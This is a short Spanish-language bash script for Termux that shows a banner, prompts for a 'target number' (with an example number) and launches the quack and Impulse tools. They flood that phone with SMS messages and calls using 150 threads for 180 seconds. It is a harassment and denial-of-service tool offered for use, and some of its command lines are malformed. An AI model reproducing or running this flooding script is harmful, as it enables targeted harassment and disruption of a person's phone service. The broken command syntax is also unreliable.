#!/bin/bash
#
# Created by: Informatic_in_Termux
#
# VARIABLES
#
PWD=$(pwd)
source ${PWD}/Colors.sh
#
# FUNCIONES
#
function SETSMS {
	sleep 0.0
	clear
echo -e "${verde}
   ▄▄▄▄    ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄    ▄▄▄▄    ▄▄▄  ▄▄▄    ▄▄▄▄
 ▄█▀▀▀▀█   ██▀▀▀▀▀▀  ▀▀▀██▀▀▀  ▄█▀▀▀▀█   ███  ███  ▄█▀▀▀▀█
 ██▄       ██           ██     ██▄       ████████  ██▄
  ▀████▄   ███████      ██      ▀████▄   ██ ██ ██   ▀████▄
      ▀██  ██           ██          ▀██  ██ ▀▀ ██       ▀██
 █▄▄▄▄▄█▀  ██▄▄▄▄▄▄     ██     █▄▄▄▄▄█▀  ██    ██  █▄▄▄▄▄█▀
  ▀▀▀▀▀    ▀▀▀▀▀▀▀▀     ▀▀      ▀▀▀▀▀    ▀▀    ▀▀   ▀▀▀▀▀
"${azul}
}
function PHONE {
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}INGRESE EL NÚMERO OBJETIVO ${verde}█
└════════════════════════════┘
┃    ┌══════════════════════════┐
└═>>>█ EJEMPLO DE NUMERO => ${blanco}+593981480757 ${azul}█
┃    └══════════════════════════┘
┃
└═>>> "${blanco}
read -r phone
}
#
# CÓDIGO
#
SETSMS
PHONE
cd
cd quack
python quack --tool SMS --target ${phone} --threads 150 --timeout 180 cd
cd Impulse
python impulse.py --method SMS -- --method call --time 180--threads 150 --target ${phone}
